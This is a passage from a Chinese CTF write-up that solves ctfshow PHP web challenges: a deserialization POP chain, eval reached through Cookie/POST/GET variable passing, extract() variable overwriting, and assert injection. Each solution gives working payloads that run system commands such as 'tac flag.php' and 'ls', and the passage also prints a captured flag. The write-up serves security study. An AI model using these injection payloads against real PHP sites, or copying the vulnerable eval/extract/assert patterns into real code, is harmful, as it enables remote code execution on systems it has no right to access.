<span class="line"><span style="color:#d4d4d4">以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家牛夫人。 你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊! ----牛夫人</span></span></code></pre></div></div></figure><p>可能有点长，但已经是最简单的多类了。我们先来进行分析：</p><p>首先分析可以作为入口的点是哪，这里有一个 wake_up 魔术方法（反序列化的时候自动调用）。</p><p>显然是满足入口条件的。找到入口之后要分析这个入口怎么联动其他方法最终输出 flag。</p><p>我们可以按果循因，看 flag 输出需要满足什么条件：</p><p>这题 flag 被放在一个 call () 函数中，但是反序列化中这种用户自定义的函数是不会自动调用的，也就是说这个 call () 函数需要被其他方法或者说函数来触发。</p><p>继续看，call () 函数还被 Ion_Fan_Princess 类中的 toString 魔术方法调用。那么怎么触发 toString 呢，立即想到 echo 这种打印输出，这个时候发现，欸？wake_up 不是刚好也有 echo 吗？到此逻辑闭合，链路清晰。</p><p>具体写法如下：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Moon</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$name</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Ion_Fan_Princess</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$nickname</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"小甜甜"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Moon</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Ion_Fan_Princess</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">name</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">serialize</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>payload：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">O:</span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">:</span><span style="color:#ce9178">"Moon"</span><span style="color:#d4d4d4">:</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">:{s:</span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">:</span><span style="color:#ce9178">"name"</span><span style="color:#d4d4d4">;O:</span><span style="color:#b5cea8">16</span><span style="color:#d4d4d4">:</span><span style="color:#ce9178">"Ion_Fan_Princess"</span><span style="color:#d4d4d4">:</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">:{s:</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">:</span><span style="color:#ce9178">"nickname"</span><span style="color:#d4d4d4">;s:</span><span style="color:#b5cea8">9</span><span style="color:#d4d4d4">:</span><span style="color:#ce9178">"小甜甜"</span><span style="color:#d4d4d4">;}}</span></span></code></pre></div></div></figure><p>传参 <code>?code</code> 即可。</p><h3 id="1web签到变量传递-有疑问"><a class="markdownIt-Anchor" href="#1web签到变量传递-有疑问"></a> 1.web 签到	(变量传递 有疑问)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: h1xa</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_REQUEST</span><span style="color:#d4d4d4">[</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#9cdcfe">$_COOKIE</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'CTFshow-QQ群:'</span><span style="color:#d4d4d4">]]]][</span><span style="color:#b5cea8">6</span><span style="color:#d4d4d4">][</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">][</span><span style="color:#b5cea8">7</span><span style="color:#d4d4d4">][</span><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">][</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">][</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">][</span><span style="color:#b5cea8">9</span><span style="color:#d4d4d4">][</span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">][</span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">]);</span></span></code></pre></div></div></figure><p>这道题的思路类似于变量覆盖，但不全是。首先写入 Cookie：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">name：CTFshow-QQ群:	value：a</span></span></code></pre></div></div></figure><p>这里就有 post [a] 存在了，看上层方法是 get，继续传递：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">post——body：a=b</span></span></code></pre></div></div></figure><p>这时就有 get [b] 存在了，继续传递：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">get：b=c</span></span></code></pre></div></div></figure><p>此时是 request [c]，request 这个可以去搜索了解，这个可以用 get 或者 pos，都是可以的。于是最终变成 request [c]，由于 request 是一个包含了<span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to 'error': Unicode text character &quot;、&quot; used in math mode [unicodeTextInMathMode] at position 6: _POST、̲">_POST、</span>_GET 和 $_COOKIE 的数组，所以最后 eval 变成：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(c[</span><span style="color:#b5cea8">6</span><span style="color:#d4d4d4">][</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">][</span><span style="color:#b5cea8">7</span><span style="color:#d4d4d4">][</span><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">][</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">][</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">][</span><span style="color:#b5cea8">9</span><span style="color:#d4d4d4">][</span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">][</span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">])</span></span></code></pre></div></div></figure><p>完整 payload（flag 在根目录）：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222156070.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221118215332237"></p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">url：http:</span><span style="color:#6a9955">//6b67a835-90bb-4e4b-87e3-bd93c12ea118.challenge.ctf.show/?b=c&amp;c[6][0][7][5][8][0][9][4][4]=system('tac /f1agaaa');</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">post：a=b</span></span>
<span class="line"><span style="color:#d4d4d4">Cookie：CTFshow-QQ群:=a</span></span></code></pre></div></div></figure><h3 id="3我的眼里只有变量覆盖"><a class="markdownIt-Anchor" href="#3我的眼里只有变量覆盖"></a> 3. 我的眼里只有 $	(变量覆盖)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">extract</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span></code></pre></div></div></figure><h4 id="extract实例"><a class="markdownIt-Anchor" href="#extract实例"></a> extract () 实例</h4><p>将键值 "Cat"、"Dog" 和 "Horse" 赋值给变量 <span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to 'error': Unicode text character &quot;、&quot; used in math mode [unicodeTextInMathMode] at position 2: a、̲">a、</span>b 和 $c：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">"Original"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#9cdcfe">$my_array</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">array</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"a"</span><span style="color:#d4d4d4"> =&gt; </span><span style="color:#ce9178">"Cat"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"b"</span><span style="color:#d4d4d4"> =&gt; </span><span style="color:#ce9178">"Dog"</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"c"</span><span style="color:#d4d4d4"> =&gt; </span><span style="color:#ce9178">"Horse"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">extract</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$my_array</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"</span><span style="color:#d7ba7d">\$</span><span style="color:#ce9178">a = </span><span style="color:#9cdcfe">$a</span><span style="color:#ce9178">; </span><span style="color:#d7ba7d">\$</span><span style="color:#ce9178">b = </span><span style="color:#9cdcfe">$b</span><span style="color:#ce9178">; </span><span style="color:#d7ba7d">\$</span><span style="color:#ce9178">c = </span><span style="color:#9cdcfe">$c</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><h4 id="定义和用法"><a class="markdownIt-Anchor" href="#定义和用法"></a> 定义和用法</h4><p>extract () 函数从数组中将变量导入到当前的符号表。</p><p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p><p>第二个参数 <em>type</em> 用于指定当某个变量已经存在，而数组中又有同名元素时，extract () 函数如何对待这样的冲突。</p><p>该函数返回成功导入到符号表中的变量数目。</p><h4 id="语法"><a class="markdownIt-Anchor" href="#语法"></a> 语法</h4><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">extract</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">array</span><span style="color:#d4d4d4">,extract_rules,prefix)</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222156323.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221119194114596"></p><h4 id="技术细节"><a class="markdownIt-Anchor" href="#技术细节"></a> 技术细节</h4><table><thead><tr><th>返回值：</th><th>返回成功导入到符号表中的变量数目。</th></tr></thead><tbody><tr><td>PHP 版本：</td><td>4+</td></tr></tbody></table><p>这里要注意 $ 包含的变量个数到底有多少个</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">首先要明确：</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$_是一个变量</span></span>
<span class="line"><span style="color:#d4d4d4">    而</span><span style="color:#9cdcfe">$$_则是最开始的这个$包含一个变量_的意思</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222156174.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221119202611119"></p><p>所以这里包含了 34 个变量。知道包含了多少个变量之后想办法覆盖，既然题目变量名是下划线，那么也就用增加下划线个数的形式来写变量名。覆盖形如：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">_ = __</span></span></code></pre></div></div></figure><p>长一点的是两个下划线。思路就是这样覆盖，最后会得到</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$________</span><span style="color:#d4d4d4"> ... )</span></span>
<span class="line"><span style="color:#6a9955">//形如这种形式</span></span></code></pre></div></div></figure><p>开始写脚本：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"_=__"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"_=__&amp;"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> (</span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4">=</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">; </span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4"> &lt; </span><span style="color:#b5cea8">34</span><span style="color:#d4d4d4">; </span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4">++) { </span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"_"</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">"_"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">"&amp;"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4">==</span><span style="color:#b5cea8">33</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">explode</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"="</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">)[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">]</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">"=system('ls');"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>循环终点要设置好，并在循环体内写好 payload 格式，就会得到：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">_=__</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">__=___</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">___=____</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">____=_____</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">_____=______</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">______=_______</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">_______=________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">________=_________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">_________=__________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">__________=___________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">___________=____________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">____________=_____________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">_____________=______________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">______________=_______________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">_______________=________________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">________________=_________________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">_________________=__________________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">__________________=___________________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">___________________=____________________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">____________________=_____________________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">_____________________=______________________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">______________________=_______________________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">_______________________=________________________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">________________________=_________________________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">_________________________=__________________________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">__________________________=___________________________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">___________________________=____________________________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">____________________________=_____________________________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">_____________________________=______________________________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">______________________________=_______________________________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">_______________________________=________________________________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">________________________________=_________________________________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">_________________________________=__________________________________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">__________________________________=___________________________________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">___________________________________=____________________________________</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">____________________________________=</span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'ls'</span><span style="color:#d4d4d4">);</span></span></code></pre></div></div></figure><p>可以通过 ls 找 flag 所在位置，这里直接贴出位置：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222156407.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221119204453860"></p><p>tac 就有了。</p><p>flag：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{</span><span style="color:#b5cea8">392</span><span style="color:#d4d4d4">dad3d-</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">f31-</span><span style="color:#b5cea8">4378</span><span style="color:#d4d4d4">-a220-</span><span style="color:#b5cea8">505466</span><span style="color:#d4d4d4">a5e5a8}</span></span></code></pre></div></div></figure><h4 id="变量覆盖小结"><a class="markdownIt-Anchor" href="#变量覆盖小结"></a> 变量覆盖小结</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_57567655/article/details/122527435">变量覆盖</a></p><h3 id="一言既出"><a class="markdownIt-Anchor" href="#一言既出"></a> 一言既出</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">); </span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">;  </span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'num'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'num'</span><span style="color:#d4d4d4">] == </span><span style="color:#b5cea8">114514</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">assert</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"intval(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#ce9178">[num])==1919810"</span><span style="color:#d4d4d4">) or </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"一言既出，驷马难追!"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    } </span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>这里是不能用等式构建的，如：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?num=</span><span style="color:#b5cea8">1919810.0</span><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">1805296</span></span></code></pre></div></div></figure><p>这种是不行的，结果会为 114514 而不能形成想象中的小数点进行一个截断从而成功绕过。</p><p>那么怎么做呢？</p><h4 id="1注释解法"><a class="markdownIt-Anchor" href="#1注释解法"></a> 1. 注释解法</h4><p>我们可以尝试让 intval 直接闭合，不进行后面的 == 判断，assert 断言还是会为真：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?num=</span><span style="color:#b5cea8">114514</span><span style="color:#d4d4d4">);</span><span style="color:#6a9955">//</span></span></code></pre></div></div></figure><p>这种写法是会通过第一层判断的，因为我们传入的这个字符串会被转换成数字类型，从而没有了后面的字符（only 弱比较）</p><h4 id="2断言利用"><a class="markdownIt-Anchor" href="#2断言利用"></a> 2. 断言利用</h4><p>我们可以尝试利用断言的机制进行构造。如果你不会断言写法，也不知道什么是断言，你只需要理解断言类似 if，而写法可以观察题目已经写出的断言：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">assert</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"intval(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#ce9178">[num])==1919810"</span><span style="color:#d4d4d4">) or </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"一言既出，驷马难追!"</span><span style="color:#d4d4d4">);</span></span></code></pre></div></div></figure><p>形如 assert () or die</p><p>知道这种写法之后就可以开始构造语句了，这里是让其为假：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?num=</span><span style="color:#b5cea8">114514</span><span style="color:#d4d4d4">)==</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4"> or </span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'tac flag.php'</span><span style="color:#d4d4d4">);</span><span style="color:#6a9955">#</span></span></code></pre></div></div></figure><p>记得 url 编码一下，flag 文件名是 ls 命令之后找到的，这里是最终写法。</p><p>断言判断为假就会执行后面的命令，另外我们将 die 注释了，程序也就不会停止，所以会运行到下一行，也会输出 flag。</p><p>所以总体上来说注释写法是最简单最容易的。</p><h3 id="驷马难追"><a class="markdownIt-Anchor" href="#驷马难追"></a> 驷马难追</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">); </span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">;  </span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'num'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">     </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'num'</span><span style="color:#d4d4d4">] == </span><span style="color:#b5cea8">114514</span><span style="color:#d4d4d4"> &amp;&amp; </span><span style="color:#dcdcaa">check</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'num'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">              </span><span style="color:#dcdcaa">assert</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"intval(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#ce9178">[num])==1919810"</span><span style="color:#d4d4d4">) or </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"一言既出，驷马难追!"</span><span style="color:#d4d4d4">);</span></span>
